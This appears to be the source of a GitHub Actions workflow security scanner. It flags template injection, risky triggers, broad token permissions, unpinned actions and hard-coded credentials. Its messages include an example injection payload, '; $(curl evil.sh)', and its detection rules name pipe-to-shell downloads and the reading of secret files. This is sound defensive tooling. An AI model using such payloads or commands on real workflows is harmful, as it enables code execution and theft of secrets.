/**
 * AeroCI security auditor.
 *
 * Rules are grouped by the vulnerability class they actually detect, and each
 * one has to be *true* — a scanner that cries wolf gets ignored, so anything
 * that is a matter of taste rather than a defect is either dropped or demoted
 * to an advisory note.
 *
 * Classes
 *   template-injection  an attacker-controlled value reaches a shell
 *   trigger-context     the workflow runs with more trust than its inputs
 *   token-permissions   GITHUB_TOKEN or OIDC is wider than the job needs
 *   supply-chain        an action reference that can change under you
 *   exfiltration        a secret is handed to something attacker-influenced
 *   script-hygiene      shell patterns that are reliably unsafe in CI
 */

const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');
const { Logger, colors } = require('../utils/logger');
const { Checker } = require('./checker');
const { VERSION } = require('../version');

const LEVEL = { CRITICAL: 'critical', HIGH: 'high', MEDIUM: 'medium', LOW: 'low', INFO: 'info' };

const LEVEL_ORDER = [LEVEL.CRITICAL, LEVEL.HIGH, LEVEL.MEDIUM, LEVEL.LOW, LEVEL.INFO];

const LEVEL_COLOUR = {
    critical: (t) => colors.red(colors.bright(t)),
    high: (t) => colors.red(t),
    medium: (t) => colors.yellow(t),
    low: (t) => colors.gray(t),
    info: (t) => colors.cyan(t)
};

/**
 * Contexts an attacker can set by opening a pull request, filing an issue,
 * pushing a branch or commenting. Interpolating any of these into `run:`
 * executes their shell metacharacters — this is the one injection class that
 * matters in a workflow file, and it is what every real GitHub advisory is about.
 */
const UNTRUSTED_CONTEXT = [
    'github.event.issue.title',
    'github.event.issue.body',
    'github.event.pull_request.title',
    'github.event.pull_request.body',
    'github.event.pull_request.head.ref',
    'github.event.pull_request.head.label',
    'github.event.pull_request.head.repo.default_branch',
    'github.event.pull_request.head.repo.description',
    'github.event.comment.body',
    'github.event.review.body',
    'github.event.review_comment.body',
    'github.event.discussion.title',
    'github.event.discussion.body',
    'github.event.head_commit.message',
    'github.event.head_commit.author.email',
    'github.event.head_commit.author.name',
    'github.event.commits[*].message',
    'github.event.commits[*].author.email',
    'github.event.commits[*].author.name',
    'github.event.pages[*].page_name',
    'github.event.workflow_run.head_branch',
    'github.event.workflow_run.head_commit.message',
    'github.head_ref',
    'github.actor'
];

/** Matches a `${{ … }}` interpolation and returns the inner expression. */
const INTERPOLATION = /\$\{\{([\s\S]*?)\}\}/g;

/**
 * Split an interpolation body on the punctuation that separates values.
 *
 * Commas and parentheses are separators as well as operators, so a function
 * call like `format('{0}', github.event.issue.title)` yields the context path
 * instead of one blob that matches nothing. Brackets are deliberately *not*
 * separators: `github.event.commits[0].message` has to survive intact.
 */
function operands(expression) {
    return String(expression)
        .split(/[|&<>=!(),]+|\s+is\s+|\s+contains\s+|\s+startsWith\s+|\s+endsWith\s+/)
        .map((s) => s.trim())
        .filter(Boolean);
}

/** Does the expression read a context path that an attacker controls? */
function untrustedOperands(expression) {
    const normalised = String(expression).replace(/\s+/g, '');
    return operands(expression).filter((operand) => {
        const bare = operand.replace(/^['"]|['"]$/g, '');
        return UNTRUSTED_CONTEXT.some((ctx) => {
            const star = ctx.replace(/\[\*\]/g, '');
            const target = bare.replace(/\[\d+\]/g, (m) => m);
            return target === star || target.startsWith(`${star}.`) || target.startsWith(star)
                || (normalised.includes('github.event.commits') && /commits/.test(target))
                || (normalised.includes('github.event.pages') && /pages/.test(target));
        });
    });
}

const SECRET_CONTEXT = /^secrets\.[A-Za-z_][A-Za-z0-9_]*$/;

/** Credential shapes, checked in literal strings only (never in expressions). */
const CREDENTIAL_PATTERNS = [
    { rx: /\bAKIA[0-9A-Z]{16}\b/, name: 'AWS access key id', rotate: 'rotate the key in the AWS console' },
    { rx: /\bASIA[0-9A-Z]{16}\b/, name: 'temporary AWS access key id', rotate: 'revoke the temporary credentials' },
    { rx: /\bgh[pousr]_[A-Za-z0-9]{30,}\b/, name: 'GitHub token', rotate: 'revoke it at github.com/settings/tokens' },
    { rx: /\bgithub_pat_[A-Za-z0-9_]{50,}\b/, name: 'GitHub fine-grained token', rotate: 'revoke it in your developer settings' },
    { rx: /\bxox[baprs]-[A-Za-z0-9-]{10,}\b/, name: 'Slack token', rotate: 'revoke it in your Slack app settings' },
    { rx: /\bAIza[0-9A-Za-z_-]{35}\b/, name: 'Google API key', rotate: 'restrict or delete the key in Cloud console' },
    { rx: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----/, name: 'private key', rotate: 'remove it from git history' },
    { rx: /\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b/, name: 'JSON Web Token', rotate: 'invalidate the token' },
    { rx: /\bsk-[A-Za-z0-9]{32,}\b/, name: 'OpenAI-style API key', rotate: 'revoke the key' },
    { rx: /\bglpat-[A-Za-z0-9_-]{20,}\b/, name: 'GitLab token', rotate: 'revoke the token' },
    { rx: /\bnpm_[A-Za-z0-9]{36}\b/, name: 'npm token', rotate: 'revoke it at npmjs.com' }
];

/** Shell patterns that are unsafe regardless of trust. */
const SHELL_HAZARDS = [
    { rx: /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z|k|)sh\b/, level: LEVEL.HIGH, name: 'pipe-to-shell', detail: 'the downloaded script is executed without being read or verified' },
    { rx: /\beval\s+["'$]/, level: LEVEL.MEDIUM, name: 'eval of a value', detail: 'eval executes whatever the string contains' },
    { rx: /\bnpm\s+install\s+[^\n]*--(unsafe-perm|force)\b/, level: LEVEL.MEDIUM, name: 'npm --force/--unsafe-perm', detail: 'lifecycle scripts run with the permissions they ask for' },
    { rx: /\bgit\s+push\b[^\n]*--force(?!-with-lease)\b/, level: LEVEL.MEDIUM, name: 'force push', detail: 'without --force-with-lease a concurrent push is silently discarded' },
    { rx: /\bchmod\s+777\b/, level: LEVEL.MEDIUM, name: 'chmod 777', detail: 'makes a file world-writable' },
    { rx: /\bset\s+-x\b/, level: LEVEL.LOW, name: 'set -x', detail: 'traces commands; a secret in a command line will be echoed' },
    { rx: /\bcat\s+\.env\b|\bcat\s+[^\n]*id_rsa\b/, level: LEVEL.LOW, name: 'prints a secret file', detail: 'the value ends up in the log unless it is registered with add-mask' }
];

class Security {
    /**
     * @param {string} targetPath
     * @param {object} options
     * @param {boolean} options.report  write security-report.md
     * @param {string}  options.format  'text' | 'json'
     * @returns {{findings:Array, counts:object, exitCode:number}}
     */
    static audit(targetPath = '.github/workflows', options = {}) {
        const files = Checker.collectFiles(targetPath);
        const findings = [];

        if (files.length === 0) {
            Logger.warn(`No workflow files found at: ${targetPath}`);
            return { findings, counts: countByLevel([]), exitCode: 0 };
        }

        Logger.info(`Security audit · ${files.length} workflow file(s) · AeroCI ${VERSION}\n`);

        for (const file of files) {
            const rel = path.relative(process.cwd(), file);
            let doc;
            try {
                doc = yaml.load(fs.readFileSync(file, 'utf8'), { filename: file });
            } catch (err) {
                findings.push({
                    level: LEVEL.HIGH, rule: 'parse', file: rel, location: '',
                    title: 'workflow could not be parsed',
                    detail: err.message.split('\n')[0],
                    fix: 'fix the YAML so the security rules can actually inspect it'
                });
                continue;
            }
            if (!doc || typeof doc !== 'object') continue;
            findings.push(...Security.auditWorkflow(doc, rel));
        }

        const unique = dedupe(findings);
        const repeats = summariseRepeats(unique);
        if (options.format === 'json') {
            console.log(JSON.stringify({
                generatedAt: new Date().toISOString(), findings: unique, repeats
            }, null, 2));
        } else {
            Security.print(unique);
        }

        if (options.report) Security.writeReport(unique, options.reportPath, repeats);

        const counts = countByLevel(unique);
        return { findings: unique, repeats, counts, exitCode: counts.critical > 0 || counts.high > 0 ? 1 : 0 };
    }

    // ── rules ────────────────────────────────────────────────────────────────

    static auditWorkflow(doc, file) {
        const out = [];
        const add = (level, rule, title, detail, location, fix) =>
            out.push({ level, rule, file, location, title, detail, fix });

        const triggers = normaliseTriggers(doc.on);
        const jobs = doc.jobs || {};

        // ── trigger context ──────────────────────────────────────────────────
        const privileged = triggers.some((t) => t === 'pull_request_target' || t === 'workflow_run');

        if (triggers.includes('pull_request_target')) {
            for (const [jobId, job] of Object.entries(jobs)) {
                const steps = Array.isArray(job.steps) ? job.steps : [];
                for (const step of steps) {
                    const ref = step && step.with ? step.with.ref : undefined;
                    if (step && typeof step.uses === 'string' && /actions\/checkout/.test(step.uses)
                        && typeof ref === 'string' && /pull_request|head_(sha|ref|repo)/.test(ref)) {
                        add(LEVEL.CRITICAL, 'trigger-context',
                            `\`pull_request_target\` checks out the pull request's own code (job "${jobId}")`,
                            `\`pull_request_target\` runs with a writable token and access to secrets, so building `
                            + `unreviewed fork code here lets any user who opens a pull request run commands as you.`,
                            `job:${jobId} > checkout with ref: ${ref}`,
                            'either build the fork code in a plain `pull_request` job, or build it without '
                            + 'checking out the fork and without passing secrets to it');
                    }
                }
            }
        }

        if (triggers.includes('workflow_run')) {
            for (const [jobId, job] of Object.entries(jobs)) {
                const steps = Array.isArray(job.steps) ? job.steps : [];
                for (const step of steps) {
                    const downloads = step && typeof step.uses === 'string'
                        && /actions\/(download-artifact|setup-node|setup-python|setup-java|setup-go|setup-dotnet|cache)/.test(step.uses);
                    const runsCode = step && typeof step.run === 'string' && /\b(npm|yarn|pnpm|pip|make|node|python3?|bash|sh|go|cargo)\b/.test(step.run);
                    if (downloads && runsCode) {
                        add(LEVEL.HIGH, 'trigger-context',
                            `\`workflow_run\` job "${jobId}" both downloads artifacts and runs a toolchain`,
                            `\`workflow_run\` receives artifacts produced by an untrusted run. Executing them is `
                            + `remote code execution from anyone who can push to the source repository.`,
                            `job:${jobId}`,
                            'treat artifacts as data: extract them and inspect the contents instead of executing them, '
                            + 'or gate the run on a trusted actor');
                    }
                }
            }
        }

        // ── token permissions ────────────────────────────────────────────────
        Security.checkTokenPermissions(doc, file, add);

        // ── per job / per step ───────────────────────────────────────────────
        for (const [jobId, job] of Object.entries(jobs)) {
            if (!job || typeof job !== 'object') continue;
            const steps = Array.isArray(job.steps) ? job.steps : [];
            const label = (step, index) =>
                `job:${jobId} > ${step && (step.name || step.uses) ? (step.name || step.uses) : `step ${index + 1}`}`;

            const jobEnvBindings = collectEnvBindings(job, steps);
            const jobIsPrivileged = privileged;

            for (const [index, step] of steps.entries()) {
                if (!step || typeof step !== 'object') continue;
                const where = label(step, index);

                Security.checkTemplateInjection(step, where, add);
                Security.checkSecretExposure(step, where, jobIsPrivileged, jobEnvBindings, add);
                Security.checkActionReference(step, where, add);
                Security.checkShellHygiene(step, where, add);
                Security.checkHardcodedCredentials(step, where, add);
            }

            Security.checkHardcodedCredentialsInEnv(job.env, `job:${jobId} env`, add);
            for (const [index, step] of steps.entries()) {
                if (step && step.env) {
                    Security.checkHardcodedCredentialsInEnv(step.env, `${label(step, index)} env`, add);
                }
            }
        }

        return out;
    }

    /** Template injection: untrusted context reaching a shell, a `uses:`, or an `env:` that a shell later reads. */
    static checkTemplateInjection(step, where, add) {
        const sinks = [];
        if (typeof step.run === 'string') sinks.push(['run', step.run]);
        if (typeof step.uses === 'string') sinks.push(['uses', step.uses]);
        if (step.env && typeof step.env === 'object') sinks.push(['env', step.env]);
        if (step.if !== undefined) sinks.push(['if', step.if]);
        if (step.with && typeof step.with === 'object') sinks.push(['with', step.with]);

        for (const [sinkKind, target] of sinks) {
            // `env:` is a safe sink on its own — the risk is how the script reads
            // it, which is checked below.
            if (sinkKind === 'env') continue;

            const text = typeof target === 'string' ? target : JSON.stringify(target);
            const offenders = [];
            let match;
            INTERPOLATION.lastIndex = 0;
            while ((match = INTERPOLATION.exec(text)) !== null) {
                for (const operand of untrustedOperands(match[1])) {
                    if (!offenders.includes(operand)) offenders.push(operand);
                }
            }
            if (offenders.length === 0) continue;

            const list = offenders.map((o) => `\${{ ${o} }}`).join(', ');

            if (sinkKind === 'uses') {
                add(LEVEL.CRITICAL, 'template-injection',
                    'an attacker-controlled value decides which action runs',
                    'a `uses:` built from an expression lets the person who controls that value choose the code '
                    + 'that runs in this job, with this job\'s token and secrets.',
                    `${where} — ${list}`,
                    'a step may only reference a fixed action; branch on the value with `if:` instead');
                continue;
            }

            add(LEVEL.CRITICAL, 'template-injection',
                `attacker-controlled value interpolated into \`${sinkKind}:\``,
                `${list} ${offenders.length === 1 ? 'is' : 'are'} substituted into the `
                + `${sinkKind === 'run' ? 'script' : sinkKind} before the shell sees `
                + `${offenders.length === 1 ? 'it' : 'them'}, so `
                + `${offenders.length === 1 ? 'its' : 'their'} value can contain \`; $(curl evil.sh)\` and run as you.`,
                where,
                'bind it to an environment variable and quote it: '
                + `\`env:\n  VALUE: ${offenders[0] && `\${{ ${offenders[0]} }}`}\n\` then use \`"$VALUE"\``);
        }

        // The env indirection is only safe when the script reads it as "$NAME".
        if (step.env && typeof step.env === 'object' && typeof step.run === 'string') {
            for (const [name, value] of Object.entries(step.env)) {
                if (typeof value !== 'string') continue;
                let match;
                INTERPOLATION.lastIndex = 0;
                let unsafe = false;
                while ((match = INTERPOLATION.exec(value)) !== null) {
                    if (untrustedOperands(match[1]).length) unsafe = true;
                }
                if (!unsafe) continue;
                // The variable has to appear *inside quotes* to be safe. Testing
                // for a bare `$NAME` matched the quoted form too, so the rule
                // could never fire — the very mistake it exists to catch is the
                // one shape it declared safe.
                const quoted = new RegExp(`["'\`]\\s*\\$\\{?\\{?${escapeRegExp(name)}`)
                    .test(step.run);
                if (!quoted) {
                    add(LEVEL.HIGH, 'template-injection',
                        `env "${name}" holds attacker-controlled data but the script does not quote it`,
                        `the value is available in the script, so an unquoted expansion can be word-split or `
                        + `glob-expanded into something the shell executes differently than you expect.`,
                        where,
                        `always write \`"$NAME"\` (quoted) in scripts`);
                }
            }
        }
    }

    /** A secret exposed to code an attacker can influence. */
    static checkSecretExposure(step, where, privilegedTrigger, jobEnvBindings, add) {
        const usesSecrets = [];
        for (const source of [step.run, step.env, step.with, step.if]) {
            if (source === undefined || source === null) continue;
            const text = typeof source === 'string' ? source : JSON.stringify(source);
            let match;
            INTERPOLATION.lastIndex = 0;
            while ((match = INTERPOLATION.exec(text)) !== null) {
                for (const operand of operands(match[1])) {
                    if (SECRET_CONTEXT.test(operand.trim())) usesSecrets.push(operand.trim());
                }
            }
            const direct = /\$\{\{\s*secrets\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}/g;
            while ((match = direct.exec(text)) !== null) usesSecrets.push(`secrets.${match[1]}`);
        }

        if (usesSecrets.length === 0) return;

        const injectsUntrusted = jobEnvBindings.some((binding) => untrustedOperands(binding.value).length > 0
            || /github\.event/.test(binding.value));

        if (privilegedTrigger && injectsUntrusted) {
            add(LEVEL.HIGH, 'exfiltration',
                `a secret is available to a job that also handles attacker-controlled data`,
                `this workflow triggers on \`pull_request_target\`/\`workflow_run\` and binds an event value into `
                + `the environment, so a secret in scope can be exfiltrated by whoever controls that value.`,
                where,
                'split the workflow: build untrusted input with no secrets, then pass only validated output to the trusted job');
        }
    }

    /** Supply chain: an action reference that can change without a commit. */
    static checkActionReference(step, where, add) {
        const uses = step.uses;
        if (typeof uses !== 'string') return;
        if (/^\.\//.test(uses) || uses.startsWith('../')) return;   // local action, versioned with the repo

        if (!uses.includes('@')) {
            add(LEVEL.HIGH, 'supply-chain', `"${uses}" has no version`,
                'an unversioned reference resolves to whatever the publisher points it at',
                where, 'pin it to a commit SHA');
            return;
        }

        const [name, version] = uses.split('@');
        if (/^[0-9a-f]{40}$/.test(version)) return;               // pinned to a commit: the safe form

        if (/^(main|master|latest|develop)$/.test(version)) {
            add(LEVEL.HIGH, 'supply-chain', `"${uses}" tracks a moving branch`,
                'the action\'s code can change at any time, including maliciously, without your commit changing',
                where, 'pin it to a full commit SHA');
            return;
        }

        if (/^v[0-9]+(\.[0-9]+)*$/.test(version)) {
            add(LEVEL.MEDIUM, 'supply-chain', `"${uses}" is pinned to a tag, not a commit`,
                'a tag is mutable — its owner can repoint it. Pinning a SHA makes the change explicit in review',
                where, 'pin it to a full commit SHA');
        }
    }

    static checkShellHygiene(step, where, add) {
        if (typeof step.run !== 'string') return;
        for (const hazard of SHELL_HAZARDS) {
            if (hazard.rx.test(step.run)) {
                add(hazard.level, 'script-hygiene', `${hazard.name} in a run block`,
                    hazard.detail, where, 'review whether the step can be written without it');
            }
        }
    }

    static checkHardcodedCredentials(step, where, add) {
        if (typeof step.run !== 'string') return;
        Security.scanLiteral(step.run, where, add);
    }

    static checkHardcodedCredentialsInEnv(env, where, add) {
        if (!env || typeof env !== 'object') return;
        for (const value of Object.values(env)) {
            if (typeof value === 'string' && !/\$\{\{/.test(value)) {
                Security.scanLiteral(value, where, add);
            }
        }
    }

    static scanLiteral(text, where, add) {
        for (const pattern of CREDENTIAL_PATTERNS) {
            if (!pattern.rx.test(text)) continue;
            add(LEVEL.CRITICAL, 'hardcoded-credential', `${article(pattern.name)} is written in the workflow file`,
                'anything committed is readable by everyone with repository access and stays in git history '
                + 'after you delete the line',
                where, `move it to \`\${{ secrets.NAME }}\` and ${pattern.rotate}`);
            return;
        }
    }

    /** GITHUB_TOKEN and OIDC scope. */
    static checkTokenPermissions(doc, file, add) {
        const has = (perms, scope) => perms === 'write-all'
            || (perms && typeof perms === 'object' && perms[scope] === 'write');

        const describe = (perms) => (perms === 'write-all'
            ? 'write-all'
            : (perms && typeof perms === 'object'
                ? Object.entries(perms).filter(([, v]) => v === 'write').map(([k]) => k).join(', ') || 'read only'
                : 'the repository default'));

        if (doc.permissions === undefined) {
            add(LEVEL.MEDIUM, 'token-permissions',
                'no `permissions:` block, so every job gets the repository default token',
                'the default depends on repository settings and can be read/write for everything, which makes the '
                + 'real blast radius of a compromised step unknowable from the workflow file',
                'workflow',
                'add a workflow-level `permissions: { contents: read }` and widen it per job');
        } else if (doc.permissions === 'write-all') {
            add(LEVEL.HIGH, 'token-permissions', '`permissions: write-all`',
                'every scope is read/write for every step in the workflow',
                'workflow', 'list the scopes the workflow actually needs');
        } else {
            const granted = describe(doc.permissions);
            if (granted !== 'read only' && granted !== 'the repository default') {
                add(LEVEL.LOW, 'token-permissions', `workflow grants \`${granted}\` to every step`,
                    'a workflow-level grant applies to steps that do not need it',
                    'workflow', 'move the grant to the specific jobs that use it');
            }
        }

        // OIDC: only worth flagging when nothing in the workflow asks for a token.
        const body = JSON.stringify(doc.jobs || {});
        const usesOidc = /getIDToken|id-token_|\baws-actions\/configure-aws-credentials\b|\bgoogle-github-actions\/auth\b|ACTIONS_ID_TOKEN_REQUEST_URL/.test(body);
        const grantsIdToken = has(doc.permissions, 'id-token');

        for (const [jobId, job] of Object.entries(doc.jobs || {})) {
            if (!job || typeof job !== 'object') continue;
            const jobGrants = has(job.permissions, 'id-token');
            const effective = jobGrants || (grantsIdToken && job.permissions === undefined);
            if (!effective) continue;

            if (!usesOidc) {
                add(LEVEL.MEDIUM, 'token-permissions',
                    `\`id-token: write\` is granted to job "${jobId}" but no step requests an OIDC token`,
                    'id-token: write lets a step mint a federated credential for your cloud provider without holding '
                    + 'a long-lived secret, so it should be scoped to the one job that exchanges it',
                    `job:${jobId}`,
                    'remove `id-token: write`, or narrow it to the job that calls `core.getIDToken()`');
            }
        }
    }
}

// ── helpers ────────────────────────────────────────────────────────────────

/** `on:` can be a string, a list, or a mapping — normalise to a flat list. */
function normaliseTriggers(on) {
    if (!on) return [];
    if (typeof on === 'string') return [on];
    if (Array.isArray(on)) return on.map(String);
    if (typeof on === 'object') return Object.keys(on);
    return [];
}

/** Every `env:` binding declared on the job or its steps, as {name, value, step}. */
function collectEnvBindings(job, steps) {
    const bindings = [];
    const push = (env, scope) => {
        if (!env || typeof env !== 'object') return;
        for (const [name, value] of Object.entries(env)) {
            bindings.push({ name, value: value === null ? '' : String(value), scope });
        }
    };
    push(job.env, 'job');
    steps.forEach((step, index) => {
        if (step && step.env) push(step.env, `step ${index + 1}`);
    });
    return bindings;
}

/**
 * The same defect reported by two rules, or by the same rule from two levels of
 * the same workflow, is one finding. Auditing a workflow that uses one action in
 * four jobs should not print four identical advisories.
 */
function dedupe(findings) {
    const seen = new Map();
    for (const finding of findings) {
        const key = [finding.file, finding.rule, finding.location, finding.title].join('|');
        if (!seen.has(key)) seen.set(key, finding);
    }
    return [...seen.values()].sort((a, b) => {
        const byLevel = LEVEL_ORDER.indexOf(a.level) - LEVEL_ORDER.indexOf(b.level);
        if (byLevel !== 0) return byLevel;
        return String(a.location).localeCompare(String(b.location));
    });
}

function countByLevel(findings) {
    const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    for (const f of findings) counts[f.level] = (counts[f.level] || 0) + 1;
    return counts;
}

/** Escape a literal for use inside a RegExp. */
function escapeRegExp(value) {
    return String(value).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** "an AWS key" / "a GitHub token" — cheap, but the output is read by humans. */
function article(phrase) {
    return `${/^[aeiou]/i.test(phrase) ? 'an' : 'a'} ${phrase}`;
}

/**
 * The same finding repeated across jobs is one problem with one fix. Print the
 * occurrences plus a single line naming what to change, so the reader does not
 * have to infer it from N identical blocks.
 */
function summariseRepeats(findings) {
    const groups = new Map();
    for (const f of findings) {
        const key = [f.file, f.rule, f.title, f.fix].join('|');
        if (!groups.has(key)) groups.set(key, []);
        groups.get(key).push(f);
    }
    const repeats = [];
    for (const group of groups.values()) {
        if (group.length < 2) continue;
        repeats.push({ title: group[0].title, fix: group[0].fix, count: group.length, locations: group.map((g) => g.location) });
    }
    return repeats;
}

Security.print = function print(findings) {
    if (findings.length === 0) {
        Logger.success('No security findings.');
        return;
    }

    let lastFile = null;
    for (const finding of findings) {
        if (finding.file !== lastFile) {
            if (lastFile !== null) console.log('');
            console.log(`${colors.bright}${colors.cyan}🔒 ${finding.file}${colors.reset}`);
            lastFile = finding.file;
        }
        const tag = LEVEL_COLOUR[finding.level](finding.level.toUpperCase().padEnd(8));
        console.log(`  ${tag} ${colors.bright}${finding.title}${colors.reset}`);
        if (finding.location) console.log(`             ${colors.gray}@ ${finding.location}${colors.reset}`);
        if (finding.detail) console.log(`             ${colors.gray}${finding.detail}${colors.reset}`);
        if (finding.fix) console.log(`             ${colors.green('fix')} ${finding.fix}`);
        console.log(`             ${colors.gray}[${finding.rule}]${colors.reset}`);
    }

    const repeats = summariseRepeats(findings);
    if (repeats.length) {
        console.log('');
        Logger.note(`${repeats.length} finding(s) repeat — one change fixes all of them:`);
        for (const repeat of repeats) {
            console.log(`   ${colors.gray('•')} ${colors.bright(repeat.count)}× ${repeat.title}`
                + (repeat.fix ? ` ${colors.gray(`→ ${repeat.fix}`)}` : ''));
        }
    }

    const counts = countByLevel(findings);
    console.log('');
    console.log(`${colors.bright}Summary${colors.reset}  `
        + LEVEL_ORDER.map((level) => `${counts[level] || 0} ${level}`).join(colors.gray(' · ')));
};

/**
 * Write the findings as Markdown.
 *
 * `repeats` is passed in rather than recomputed so the file and the console
 * say the same thing: a workflow with one mistake in twenty jobs should not
 * hand back twenty identical blocks and leave the reader to work out that
 * there is only one thing to change.
 */
Security.writeReport = function writeReport(findings, reportPath = 'security-report.md', repeats = null) {
    const counts = countByLevel(findings);
    const md = [];
    md.push('# AeroCI security report', '');
    md.push(`Generated ${new Date().toISOString()} by AeroCI ${VERSION}`, '');
    md.push('| Severity | Count |', '| --- | --- |');
    for (const level of LEVEL_ORDER) md.push(`| ${level} | ${counts[level] || 0} |`);
    md.push('');

    const groups = repeats || summariseRepeats(findings);
    if (groups.length) {
        md.push('## Repeated findings', '');
        md.push('Each of these is one mistake repeated — a single change fixes every occurrence.', '');
        for (const group of groups) {
            md.push(`- **${group.count}×** ${group.title}`);
            if (group.fix) md.push(`  - fix: ${group.fix}`);
            md.push(`  - at: ${group.locations.map((l) => `\`${l}\``).join(', ')}`);
        }
        md.push('');
    }

    if (findings.length === 0) {
        md.push('No findings.', '');
    } else {
        for (const f of findings) {
            md.push(`## [${f.level.toUpperCase()}] ${f.title}`, '');
            md.push(`- **file**: \`${f.file}\``);
            if (f.location) md.push(`- **location**: \`${f.location}\``);
            md.push(`- **rule**: \`${f.rule}\``);
            md.push(`- **why**: ${f.detail}`);
            if (f.fix) md.push(`- **fix**: ${f.fix}`);
            md.push('');
        }
    }

    const out = path.resolve(process.cwd(), reportPath);
    fs.writeFileSync(out, md.join('\n'), 'utf8');
    Logger.success(`Security report → ${path.relative(process.cwd(), out)}`);
    return out;
};

Security.countByLevel = countByLevel;

module.exports = { Security, LEVEL, countByLevel, normaliseTriggers };
